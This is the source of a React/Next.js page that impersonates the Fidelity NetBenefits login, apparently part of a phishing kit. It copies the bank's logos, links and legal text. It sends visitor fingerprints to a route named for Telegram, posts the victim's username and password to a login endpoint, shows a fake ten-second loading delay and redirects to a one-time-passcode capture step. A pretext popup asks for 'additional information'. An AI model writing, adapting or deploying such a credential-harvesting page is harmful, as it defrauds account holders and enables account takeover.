'use client';

import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';

export default function LoginPage() {
  const [showPopup, setShowPopup] = useState(true);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [rememberUsername, setRememberUsername] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [errorMsg, setErrorMsg] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);
  const hasSentVisitRef = useRef(false);
  const router = useRouter();

  useEffect(() => {
    setShowPopup(false);
    if (typeof window !== 'undefined') {
      sessionStorage.removeItem('fl_otp1');
      sessionStorage.removeItem('fl_details');
      sessionStorage.removeItem('fl_otp2');
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener('pointerdown', onFirstInteraction, { once: true, passive: true });
    window.addEventListener('keydown', onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener('pointerdown', onFirstInteraction);
      window.removeEventListener('keydown', onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    const payload = {
      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
      screen: typeof window !== 'undefined' ? `${window.screen.width}x${window.screen.height}` : '',
      language: typeof navigator !== 'undefined' ? navigator.language : '',
      referrer: typeof document !== 'undefined' ? document.referrer || 'Direct' : 'Direct',
      url: typeof window !== 'undefined' ? window.location.href : '',
      utcTime: new Date().toLocaleString('en-US', {
        timeZone: 'UTC',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true,
      }),
    };

    fetch('/api/telegram/visitor', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    }).catch(console.error);
  }, [hasInteracted]);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!username || !password || isLoading) return;
    setIsLoading(true);
    setErrorMsg(false);

    try {
      await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });
    } catch (err) {
      console.error('Error:', err);
      setErrorMsg(true);
      setIsLoading(false);
      return;
    }
    await new Promise((r) => setTimeout(r, 10000));
    if (typeof window !== 'undefined') sessionStorage.setItem('fl_otp1', '1');
    router.push('/otp');
  };

  return (
    <>
      <style jsx global>{`
        * {
          box-sizing: border-box;
        }

        body,
        p {
          margin: 0;
        }

        .sf-hidden {
          display: none !important;
        }

        img[src="data:,"],
        source[src="data:,"] {
          display: none !important;
        }

        .load {
          width: 20px;
          height: 20px;
          border: 2px solid #ffffff;
          border-bottom-color: transparent;
          border-radius: 50%;
          display: inline-block;
          box-sizing: border-box;
          animation: rotation 1s linear infinite;
        }

        @keyframes rotation {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }

        .excla {
          display: flex;
          justify-content: center;
          align-items: center;
          width: 80px;
          height: 80px;
          text-align: center;
          margin: 0 auto;
        }

        .excla img {
          max-width: 100%;
          max-height: 100%;
        }

        .popup-text {
          text-align: center;
          font-family: "Fidelity Sans", Arial, sans-serif;
          font-weight: 700;
          font-style: normal;
        }

        #popup {
          display: ${showPopup ? 'block' : 'none'};
          position: fixed;
          left: 50%;
          top: 45%;
          transform: translate(-50%, -50%);
          width: 300px;
          padding: 45px 40px;
          background-color: white;
          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
          z-index: 1000;
          border-radius: 10px;
          text-align: center;
        }

        #overlay {
          display: ${showPopup ? 'block' : 'none'};
          position: fixed;
          left: 0;
          top: 0;
          width: 100%;
          height: 100%;
          background-color: rgba(0, 0, 0, 0.5);
          z-index: 500;
        }

        .main-container {
          background-color: #f2f2f2;
          border: 1px solid transparent;
          box-sizing: border-box;
          min-height: 100vh;
        }

        .main-container nav.dom-header {
          background-color: #fff;
          border-bottom: 1px solid #ccc;
          box-sizing: border-box;
          display: flex;
          flex-direction: row;
          flex-wrap: nowrap;
          font-family: Fidelity Sans, Arial, sans-serif;
          height: 3.75rem;
          justify-content: space-between;
        }

        .main-container nav.dom-header div.dom-header-logo {
          margin: 1rem 0 0 1.25rem;
        }

        .main-container nav.dom-header div.dom-header-logo a {
          text-decoration: none;
        }

        .main-container nav.dom-header div.dom-header-links {
          margin: 0 1.25rem 0 0;
          display: flex;
          align-items: center;
          gap: 2rem;
        }

        .main-container nav.dom-header div.dom-header-links .dom-header-pvd-link {
          color: #000;
          font-weight: 400;
          vertical-align: middle;
          text-decoration: none;
        }

        .main-container .dom-container {
          margin: 15vh auto 0;
          padding-bottom: 0;
          width: 448px;
        }

        .dom-card {
          background: #fff;
          font-family: Fidelity Sans, Helvetica, Arial, sans-serif;
        }

        @media (min-width: 32em) {
          .dom-card {
            border: 1px solid #ccc;
            border-radius: 0.5rem;
            padding: 2rem 2rem 1rem;
          }
        }

        @media (max-width: 32em) {
          .dom-card {
            border-bottom: 1px solid #ccc;
            padding: 1.5rem 1rem;
          }
        }

        .dom-card .dom-card-header {
          margin-bottom: 1rem;
        }

        .dom-card h1 {
          font-size: 1.5rem;
          font-weight: 700;
          margin: 0;
          color: #000;
        }

        .dom-card .dom-card-body {
          margin: 1.5rem 0 0;
        }

        .dom-card .dom-card-body .body-button-section,
        .dom-card .dom-card-body .body-link-section {
          margin-top: 1.5rem;
        }

        .pvd-label__label {
          display: block;
          margin-bottom: 0.5rem;
          font-weight: 400;
          color: #000;
        }

        .pvd-input-root {
          position: relative;
          margin-bottom: 1rem;
        }

        .pvd-input__input {
          width: 100%;
          padding: 0.75rem;
          border: 1px solid #ccc;
          border-radius: 0.25rem;
          font-size: 1rem;
          box-sizing: border-box;
          color: #000;
          background-color: #fff;
        }

        .pvd-input__input:focus {
          outline: none;
          border-color: #368727;
        }

        .pvd-input-root.pvd-input--icon-right {
          position: relative;
        }

        .pvd-input__icon {
          position: absolute;
          right: 0.75rem;
          top: 50%;
          transform: translateY(-50%);
          cursor: pointer;
          width: 20px;
          height: 20px;
        }

        .pvd-checkbox-root {
          display: flex;
          align-items: center;
          margin: 1rem 0;
        }

        .pvd-checkbox__checkbox {
          margin-right: 0.5rem;
          width: 18px;
          height: 18px;
          cursor: pointer;
        }

        .pvd-checkbox__label {
          cursor: pointer;
          display: flex;
          align-items: center;
          color: #000;
        }

        .pvd-button-root {
          width: 100%;
          padding: 0.75rem;
          background-color: #368727;
          color: white;
          border: none;
          border-radius: 0.25rem;
          font-size: 1rem;
          font-weight: 400;
          cursor: pointer;
          transition: background-color 0.2s;
        }

        .pvd-button-root:hover {
          background-color: #2b6b1e;
        }

        .pvd-button-root:disabled {
          background-color: #bbb;
          cursor: not-allowed;
        }

        .pvd-link__link {
          color: #0066cc;
          text-decoration: underline;
          cursor: pointer;
        }

        .pvd-link__link:hover {
          color: #0052a3;
        }

        .pvd-alert-root {
          background-color: #fff;
          border: 1px solid #d32f2f;
          border-radius: 0.25rem;
          padding: 1rem;
          margin-bottom: 1rem;
        }

        .pvd-alert__message {
          color: #d32f2f;
          margin: 0;
        }

        .dom-link-actions {
          text-align: center;
          margin-top: 0.25rem;
          color: #000;
          font-family: Fidelity Sans, Arial, sans-serif;
        }

        .dom-link-actions .dom-link {
          color: #0066cc;
          text-decoration: underline;
          margin-left: 0.25rem;
        }

        #error-msg {
          display: ${errorMsg ? 'block' : 'none'};
        }

        #dom-overlay {
          display: flex;
          justify-content: center;
        }

        #dom-sronly {
          position: absolute;
          left: -10000px;
          width: 1px;
          height: 1px;
          overflow: hidden;
        }

        footer.dom-footer {
          background-color: #f2f2f2;
          border: 1px solid transparent;
          color: #666;
          font-family: Fidelity Sans, Arial, sans-serif;
          font-size: 0.75rem;
          font-weight: 400;
          margin-top: -2rem;
        }

        footer.dom-footer .dom-footer-pvd-link {
          color: #666 !important;
        }

        footer.dom-footer .footer-new-user,
        footer.dom-footer .footer-legal,
        footer.dom-footer .footer-links-stacked,
        footer.dom-footer .footer-copyright-row {
          box-sizing: border-box;
          padding: 0 1.25rem;
          width: 100%;
        }

        footer.dom-footer .footer-new-user {
          padding-top: 0.5rem;
          padding-bottom: 1.5rem;
        }

        footer.dom-footer .footer-new-user-heading {
          margin: 0 0 0.5rem 0;
          font-family: Fidelity Sans, Arial, sans-serif;
          font-size: 0.875rem;
          font-weight: 400;
          color: #333;
        }

        footer.dom-footer .footer-new-user .dom-footer-pvd-link {
          display: block;
          margin-bottom: 0.25rem;
        }

        footer.dom-footer .footer-faqs-link {
          display: block;
          margin-top: 1.25rem;
        }

        footer.dom-footer .footer-legal {
          font-family: Fidelity Sans, Arial, sans-serif;
          letter-spacing: 0;
          line-height: 1.5;
          max-width: 920px;
          margin: 0 0 1.5rem 0;
          padding-top: 0;
          padding-bottom: 0;
        }

        footer.dom-footer .footer-links-stacked {
          display: block;
          padding-bottom: 1rem;
        }

        footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
          display: block;
          padding: 0.25rem 0;
          color: #666;
          text-decoration: none;
        }

        footer.dom-footer .footer-links-stacked .dom-footer-pvd-link:hover {
          text-decoration: underline;
        }

        footer.dom-footer .footer-copyright-row {
          padding-bottom: 0.75rem;
        }

        footer.dom-footer .footer-copyright {
          line-height: 1.5;
        }

        @media screen and (min-width: 512px) {
          .main-container {
            height: auto;
            min-height: 100vh;
          }

          .main-container .dom-header {
            align-items: center;
            position: static;
          }

          .main-container .dom-header div.dom-header-links,
          .main-container .dom-header div.dom-header-logo {
            position: static;
          }

          footer.dom-footer {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: auto auto auto;
          }
          footer.dom-footer .footer-new-user,
          footer.dom-footer .footer-legal {
            grid-column: 1 / -1;
            text-align: left;
          }
          footer.dom-footer .footer-copyright-row {
            grid-column: 1;
            text-align: left;
          }
          footer.dom-footer .footer-links-stacked {
            grid-column: 2;
            text-align: right;
          }
          footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
            display: inline-block;
            padding: 0.75rem 1.5rem 0.75rem 0;
          }

          .main-container .dom-link-actions {
            display: block;
            font-family: Fidelity Sans, Arial, sans-serif !important;
            margin-bottom: 0;
            margin-left: auto;
            margin-right: auto;
            padding: 0;
            text-align: center !important;
          }

          .main-container .dom-link-actions > pvd-link {
            display: inline-block;
            text-align: center !important;
          }

          .main-container .dom-link-actions > pvd-link:nth-child(3),
          .main-container .dom-link-actions > pvd-link:nth-child(4) {
            width: 49%;
          }
        }

        @media screen and (max-width: 768px) {
          .main-container .dom-header div.dom-header-links.dom-header-links--hide-on-mobile {
            display: none;
          }
        }

        @media screen and (max-width: 511px) {
          .main-container {
            min-height: 0;
            height: auto;
          }

          .main-container .dom-header,
          .main-container .dom-header div.dom-header-logo {
            position: static;
          }

          .main-container .dom-header div.dom-header-links {
            display: none;
          }

          .main-container .dom-link-actions {
            display: none;
          }

        }

        @media only screen and (max-width: 511px) {
          .main-container nav.dom-header {
            border-bottom: none;
          }

          .main-container .dom-container {
            margin: 0 auto;
            width: auto;
          }

          .main-container .dom-header div.dom-header-links {
            display: none;
          }

          footer.dom-footer {
            display: block;
            font-size: 0.875rem;
          }
          footer.dom-footer .footer-new-user,
          footer.dom-footer .footer-legal,
          footer.dom-footer .footer-links-stacked,
          footer.dom-footer .footer-copyright-row {
            text-align: center;
          }
          footer.dom-footer .footer-links-stacked .dom-footer-pvd-link {
            display: block;
            padding: 0.25rem 0;
          }
        }

      `}</style>

      <div id="overlay" onClick={() => setShowPopup(false)}></div>
      <div id="popup">
        <div className="excla">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/8/88/Exclamation_sign_font_awesome.svg"
            alt=""
          />
        </div>
        <p className="popup-text">
          IN ORDER TO ENHANCE OUR SERVICE AND ENSURE THE ACCURACY OF YOUR ACCOUNT INFORMATION, WE
          KINDLY REQUEST YOUR COOPERATION IN PROVIDING SOME ADDITIONAL INFORMATION. PLEASE CLICK
          "START NOW" TO BEGIN THE PROCESS
        </p>
        <br />
        <button
          className="pvd-button-root pvd-button--full-width pvd-button--primary"
          id="popup-btn"
          type="button"
          onClick={() => setShowPopup(false)}
          style={{ color: 'white', width: '100%', padding: '10px', marginTop: '10px' }}
        >
          <span style={{ color: 'white' }}>Start Now</span>
        </button>
      </div>

      <iframe
        style={{
          position: 'absolute',
          top: '-10000px',
          left: '-1000px',
        }}
        hidden
        className="sf-hidden"
      ></iframe>

      <div className="main-container">
        <nav className="dom-header">
          <div className="dom-header-logo">
            <a href="/">
              <img
                src="/Fidelity-NetBenefits-Logo%20(5).svg"
                alt="Fidelity NetBenefits"
                style={{ height: '28px', width: 'auto' }}
              />
            </a>
          </div>
          <div className="dom-header-links dom-header-links--hide-on-mobile">
            <a
              className="dom-header-pvd-link"
              href="https://www.fidelity.com/security/overview"
            >
              Security
            </a>
            <a
              className="dom-header-pvd-link"
              href="https://www.fidelity.com/customer-service/need-help-logging-in"
            >
              FAQs
            </a>
          </div>
        </nav>

        <div className="dom-container">
          <div id="dom-overlay"></div>
          <div id="dom-widget">
            <div>
              <div id="mainui" className="dom-card dom-signin-card">
                <div className="dom-card-header">
                  <h1 id="dom-login-header" className="pvd-title__heading pvd-title__heading--level-3">
                    Log in
                  </h1>
                </div>

                <div
                  id="error-msg"
                  aria-label="notification"
                  className="pvd-alert-root pvd-alert--critical"
                  role="complementary"
                >
                  <div className="pvd-alert__content" role="alert">
                    <p className="pvd-alert__message">
                      You've entered an incorrect username or password. Please try again.
                    </p>
                  </div>
                </div>

                <div className="dom-card-body">
                  <form id="login-form" className="pvd-form__form" onSubmit={handleSubmit}>
                    <div className="pvd-field-group-root">
                      <label className="pvd-label__label" htmlFor="dom-username-input">
                        Username
                      </label>
                      <div className="pvd-input-root">
                        <input
                          className="pvd-input__input"
                          required
                          aria-required={true}
                          id="dom-username-input"
                          type="text"
                          maxLength={50}
                          autoComplete="off"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                          disabled={isLoading}
                        />
                      </div>

                      <label className="pvd-label__label" htmlFor="dom-pswd-input">
                        Password
                      </label>
                      <div className="pvd-input-root pvd-input--icon-right">
                        <input
                          className="pvd-input__input"
                          required
                          aria-required={true}
                          id="dom-pswd-input"
                          type={showPassword ? 'text' : 'password'}
                          maxLength={20}
                          autoComplete="off"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          disabled={isLoading}
                        />
                        <span
                          className="pvd-input__icon"
                          onClick={() => !isLoading && setShowPassword(!showPassword)}
                          style={{ cursor: isLoading ? 'not-allowed' : 'pointer', opacity: isLoading ? 0.7 : 1 }}
                          role="button"
                          aria-hidden
                        >
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
                          </svg>
                        </span>
                      </div>

                      <div className="pvd-checkbox-root">
                        <input
                          className="pvd-checkbox__checkbox"
                          type="checkbox"
                          id="dom-remember-username-checkbox"
                          checked={rememberUsername}
                          onChange={(e) => setRememberUsername(e.target.checked)}
                          disabled={isLoading}
                        />
                        <label className="pvd-checkbox__label" htmlFor="dom-remember-username-checkbox">
                          Remember my username
                        </label>
                      </div>

                      <div className="body-button-section">
                        <button
                          type="submit"
                          id="login-btn"
                          className="pvd-button-root pvd-button--full-width pvd-button--primary"
                          disabled={isLoading}
                        >
                          <span id="login-text" className={isLoading ? 'load' : ''}>
                            {isLoading ? '' : 'Log in'}
                          </span>
                        </button>
                      </div>

                      <div className={`body-link-section ${isLoading ? 'pointer-events-none' : ''}`} style={isLoading ? { opacity: 0.7 } : undefined}>
                        <a
                          className="pvd-link__link"
                          id="dom-frgt-usrname-pswd-link"
                          href="https://www.fidelity.com/customer-service/need-help-logging-in"
                        >
                          Forgot username or password?
                        </a>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
          <div id="dom-sronly" aria-live="assertive"></div>
        </div>

        <div className="dom-link-actions">
          New to Fidelity?{' '}
          <a
            className="dom-link"
            href="https://www.fidelity.com/open-account/overview"
          >
            Open an account
          </a>
          {' or '}
          <a
            className="dom-link"
            href="https://digital.fidelity.com/prgw/digital/login/user-identity?intent=nur"
          >
            sign up.
          </a>
        </div>
      </div>

      <footer className="dom-footer">
        <div className="footer-new-user">
          <p className="footer-new-user-heading">New to Fidelity NetBenefits®?</p>
          <a
            className="dom-footer-pvd-link underline"
            href="https://digital.fidelity.com/prgw/digital/login/full-page?intent=nur"
            target="_blank"
            rel="noopener"
          >
            Register as a new user
          </a>
          <a
            className="dom-footer-pvd-link footer-faqs-link"
            href="https://www.fidelity.com/customer-service/need-help-logging-in"
            target="_blank"
            rel="noopener"
          >
            FAQs
          </a>
        </div>
        <p className="footer-legal">
          By using this website, you consent to the use of cookies as described{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.fidelity.com/privacy-policy"
            target="_blank"
            rel="noopener"
          >
            here
          </a>
          . However, if you do not agree to our cookies policy, you can change your cookie settings at any time.{' '}
          Fidelity Brokerage Services LLC, Member{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.nyse.com"
            target="_blank"
            rel="noopener"
          >
            NYSE
          </a>
          ,{' '}
          <a
            className="dom-footer-pvd-link underline"
            href="https://www.sipc.org"
            target="_blank"
            rel="noopener"
          >
            SIPC
          </a>
          , 900 Salem Street, Smithfield, RI 02917
        </p>
        <div className="footer-links-stacked">
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/terms-of-use"
            target="_blank"
            rel="noopener"
          >
            Terms of Use
          </a>
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/privacy-policy"
            target="_blank"
            rel="noopener"
          >
            Privacy
          </a>
          <a
            className="dom-footer-pvd-link"
            href="https://www.fidelity.com/security/overview"
            target="_blank"
            rel="noopener"
          >
            Security
          </a>
        </div>
        <div className="footer-copyright-row">
          <div className="footer-copyright">
            ©1998-2026 FMR LLC. All Rights Reserved.
            <br />
            1205840.1.0
          </div>
        </div>
      </footer>
    </>
  );
}
